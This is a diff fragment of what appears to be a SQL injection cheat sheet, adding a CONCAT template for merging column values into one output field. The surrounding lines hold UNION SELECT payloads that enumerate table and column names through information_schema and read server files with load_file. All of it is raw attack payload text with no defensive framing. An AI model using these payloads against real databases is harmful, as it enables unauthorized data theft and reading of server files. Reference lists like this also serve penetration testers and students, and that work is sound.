@@ -2406,6 +2406,9 @@ UNION all select 1,...,table_name from information_schema.tables
 # information_schema : get table columns
 UNION all select 1,...,column_name from information_schema.columns where table_name='table_name_here'
 
+# concatenate columnnames into one output field
+CONCAT(column_name_here,':',another_column_name_here,':',yet_another_column_name_here)
+
 # file read
 UNION all select 1,...,load_file('/path/to/file/here')
 
